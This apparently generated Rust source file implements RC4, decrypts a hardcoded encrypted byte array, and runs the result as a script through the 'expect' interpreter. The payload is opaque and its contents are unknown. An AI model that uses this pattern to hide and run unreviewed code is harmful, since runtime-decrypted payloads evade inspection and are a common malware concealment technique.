
use std::io;
use std::iter::repeat;
use std::io::Write;
use std::process;
use std::process::{Command, Stdio};
use std::env;

pub struct Arc4 {
    i: u8,
    j: u8,
    state: [u8; 256],
}

impl Arc4 {
    pub fn new(key: &[u8]) -> Arc4 {
        assert!(key.len() >= 1 && key.len() <= 256);
        let mut rc4 = Arc4 {
            i: 0,
            j: 0,
            state: [0; 256],
        };
        for (i, x) in rc4.state.iter_mut().enumerate() {
            *x = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256 {
            j = j
                .wrapping_add(rc4.state[i])
                .wrapping_add(key[i % key.len()]);
            rc4.state.swap(i, j as usize);
        }
        rc4
    }
    fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.state[self.i as usize]);
        self.state.swap(self.i as usize, self.j as usize);
        let k = self.state
            [(self.state[self.i as usize].wrapping_add(self.state[self.j as usize])) as usize];
        k
    }

    fn encode_vec(&mut self, input: &[u8], output: &mut [u8]) {
        assert!(input.len() == output.len());
        for (x, y) in input.iter().zip(output.iter_mut()) {
            *y = *x ^ self.next();
        }
    }

    pub fn trans_vec(&mut self, input: &Vec<u8>) -> Vec<u8> {
        let mut out: Vec<u8> = repeat(0).take(input.len()).collect();
        self.encode_vec(input, &mut out);
        return out.to_vec();
    }

    pub fn trans_str(&mut self, str: &String) -> Vec<u8> {
        return self.trans_vec(&str.as_bytes().to_vec());
    }
}

fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
    let prog = format!("{}", prog.to_owned());
    //println!("{}", prog);
    let opt = if iterp == "ruby" { "-e" } else { "-c" };
    let output = Command::new(iterp)
        .arg(opt)
        .arg(prog)
        .args(args)
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute process");
    //println!("status: {}", output.status.code().unwrap());
    std::process::exit(output.status.code().unwrap());
}

fn main() {
    let prog = vec![205, 35, 174, 220, 63, 1, 220, 163, 198, 167, 255, 74, 40, 147, 206, 30, 137, 68, 143, 143, 41, 101, 142, 70, 63, 6, 108, 201, 25, 156, 77, 197, 247, 164, 152, 134, 188, 207, 155, 225, 161, 247, 93, 161, 11, 36, 139, 188, 145, 11, 239, 154, 179, 115, 193, 116, 37, 23, 200, 70, 228, 146, 88, 134, 48, 148, 123, 28, 55, 7, 178, 25, 251, 171, 207, 159, 34, 47, 198, 25, 2, 216, 99, 245, 195, 145, 71, 71, 67, 137, 34, 237, 168, 21, 171, 229, 56, 94, 150, 13, 95, 241, 98, 139, 105, 81, 64, 189, 57, 91, 22, 203, 224, 191, 39, 73, 66, 66, 46, 243, 137, 8, 151];
    let rand_key = "ffnE3oa1KPaQTT8biuLFXpR1rpgKXuWSvfOqNBLqu7F4xaP44ss6t54na8tAsXOsaEylULhfZVBZfFZ5Vx47GFE32oZQvr9p1PaAkqkwQZQ55BiGiD34papAUAGeDCsu";
    let pass = "";
    let iterp = "expect";

    if pass.len() != 0 {
        let mut input = String::new();
        print!("Password: ");
        io::stdout().flush().ok();
        io::stdin()
            .read_line(&mut input)
            .ok()
            .expect("Couldn't read password");
        if input.trim() != pass {
            println!("Invalid password!");
            process::exit(1);
        }
    }
    let prog_vec = Arc4::new(rand_key.to_string().as_bytes()).trans_vec(&prog);
    let prog_str = String::from_utf8(prog_vec).unwrap();
    //println!("running ...:\n {}", prog_str);
    let mut args = env::args().collect::<Vec<_>>();
    args.drain(0..1);
    run_process(&iterp.to_string(), &prog_str, &args);
}
